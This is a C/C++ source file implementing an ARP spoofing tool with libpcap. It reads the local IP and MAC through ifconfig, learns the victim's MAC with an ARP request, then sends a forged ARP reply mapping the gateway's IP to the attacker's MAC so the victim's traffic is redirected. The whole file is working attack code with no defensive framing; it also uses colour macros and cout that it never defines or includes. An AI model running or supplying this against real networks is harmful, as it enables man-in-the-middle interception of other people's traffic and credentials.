#include <arpa/inet.h>
#include <netinet/ether.h>
#include <netinet/in.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <fstream>
#include <string>
#define MAXLINE 256

void arp_main(const char *interface, const char *target_ip, const char *gateway_ip)
{
    using namespace std;
    pcap_t *handle;         /* Session handle */
    char *dev;          /* The device to sniff on */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    struct bpf_program fp;      /* The compiled filter */
    char filter_exp[] = "port ";    /* The filter expression */
    bpf_u_int32 mask;       /* Our netmask */
    bpf_u_int32 net;        /* Our IP */
    struct pcap_pkthdr *header; /* The header that pcap gives us */

    int res;
    const u_char *pkt;
    u_char send_pkt[42];   /* packet for sender*/
    u_char sendBuf[18];
    struct tm *ltime;
    char timestr[16];
    time_t local_tv_sec;
    char buf[INET_ADDRSTRLEN];

    /* ether, arp header */

    struct ether_header *eth;
    struct ether_arp *arp;

    /* Sender info */
    char senderIP[16];
    char senderMAC[18];
    char targetMAC[18];

    /* Find Mac Address and IP */

    FILE *fp2;

    fp2 = popen( "ifconfig | grep -A3 \"192.\" | sed -n 1p | awk '{print $2}'", "r");
    if ( NULL == fp2)
    {
        perror( "popen() 실패");
    }

    while( fgets( senderIP, 17, fp2) );
    pclose( fp2);

    fp2 = popen( "ifconfig | grep -A3 \"192.\" | sed -n 3p | awk '{print $2}'", "r");
    if ( NULL == fp2)
    {
        perror( "popen() 실패");
    }

    while( fgets( senderMAC, 19, fp2) );
    pclose( fp2);

   cout << GREEN << BOLD << "Arp spoofing:\n" << RESET
        << RESET << RED << " ~ " << RESET << BOLD << "Target IP: " << target_ip
        << "\n"
        << RESET << RED << " ~ " << RESET << BOLD << "Mac: " << RESET << senderMAC
        << RESET << RESET << RED << " ~ " << RESET << BOLD
        << "Gateway IP: " << RESET << gateway_ip << std::endl
        << RESET << RESET << RED << " ~ " << RESET << BOLD
        << "Device: " << RESET << interface << std::endl;

    /* Define the device */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        cout << RESET << "\n[" << RED << "-" << RESET << "]" << " Couldn't find default device:\n";
        exit(1);
    }
    /* Find the properties for the device */
    if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
        cout << RESET << "\n[" << RED << "-" << RESET << "]" << " Couldn't get netmask for device\n";
        mask = 0;
        exit(1);
    }
    /* Open the session in promiscuous mode */
    handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        cout << RESET << "\n[" << RED << "-" << RESET << "]" << " Couldn't open device\n";
        exit(1);
    }

    /* Make packet to send ARP to Target */

    eth=(struct ether_header *)send_pkt;
    ether_aton_r("FF:FF:FF:FF:FF:FF", (struct ether_addr *)eth->ether_dhost);
    ether_aton_r(senderMAC, (struct ether_addr *)eth->ether_shost);
    eth->ether_type=htons(ETHERTYPE_ARP);

    arp=(struct ether_arp *)(send_pkt+ETH_HLEN);
    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = ETHER_ADDR_LEN;
    arp->arp_pln = sizeof(struct in_addr);
    arp->arp_op  = htons(ARPOP_REQUEST);
    ether_aton_r(senderMAC, (struct ether_addr *)arp->arp_sha);
    cout << "\n Sequenz: ";
    for(int i=0;i<6;i++)    printf("%02x ", *(arp->arp_sha+i));
    printf("\n");
    inet_pton(AF_INET, target_ip, arp->arp_spa);
    //memcpy(arp->arp_spa, senderIP,sizeof(struct in_addr));       //inet_pton(AF_INET, "192.168.1.1", arp->arp_spa);
    ether_aton_r("00:00:00:00:00:00", (struct ether_addr *)arp->arp_tha);
    inet_pton(AF_INET,target_ip, arp->arp_tpa);

    if(pcap_sendpacket(handle, send_pkt, sizeof(send_pkt)) == -1)
    {
        cout << RESET << "\n[" << RED << "-" << RESET << "]" << " Error\n";
        exit(1);
    }

    while((res = pcap_next_ex( handle, &header, &pkt)) >= 0){

        if(res == 0)
            /* Timeout elapsed */
            continue;

        /* convert the timestamp to readable format */
        local_tv_sec = header->ts.tv_sec;
        ltime=localtime(&local_tv_sec);
        strftime( timestr, sizeof timestr, "%H:%M:%S", ltime);
        cout << RESET << "[" << GREEN << "I" << RESET << "] " << "Header " << BLUE << header->ts.tv_usec << RESET << " Lenght: " << RED << header->len << RESET << std::endl;
        //printf("[%s] Header: %.6d Lenght:%d\n", timestr, header->ts.tv_usec, header->len);
        eth=(struct ether_header *)pkt;
        arp=(struct ether_arp *)(pkt+ETH_HLEN);
        /* Check ARP */
        if(ntohs(eth->ether_type) == ETHERTYPE_ARP ){
            sprintf(targetMAC, "%s", ether_ntoa(((ether_addr*)arp->arp_sha)));
            break;
        }
    }

    /* Make packet to send ARP to Target */

    eth=(struct ether_header *)send_pkt;
    ether_aton_r(targetMAC, (struct ether_addr *)eth->ether_dhost);
    ether_aton_r(senderMAC, (struct ether_addr *)eth->ether_shost);
    eth->ether_type=htons(ETHERTYPE_ARP);

    arp=(struct ether_arp *)(send_pkt+ETH_HLEN);
    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = ETHER_ADDR_LEN;
    arp->arp_pln = sizeof(struct in_addr);
    arp->arp_op  = htons(ARPOP_REPLY);
    ether_aton_r(senderMAC, (struct ether_addr *)arp->arp_sha);

    inet_pton(AF_INET, gateway_ip, arp->arp_spa);
    //memcpy(arp->arp_spa, senderIP,sizeof(struct in_addr));       //inet_pton(AF_INET, "192.168.1.1", arp->arp_spa);
    ether_aton_r(targetMAC, (struct ether_addr *)arp->arp_tha);
    inet_pton(AF_INET, target_ip, arp->arp_tpa);


    if(pcap_sendpacket(handle, send_pkt, sizeof(send_pkt)) == -1)
        cout << RESET << "\n[" << RED << "-" << RESET << "]" << " Well we have a problem\n";
    else
        cout << RESET << "\n[" << GREEN << "+" << RESET << "]" << " Spoofing sucessfull\n";

}

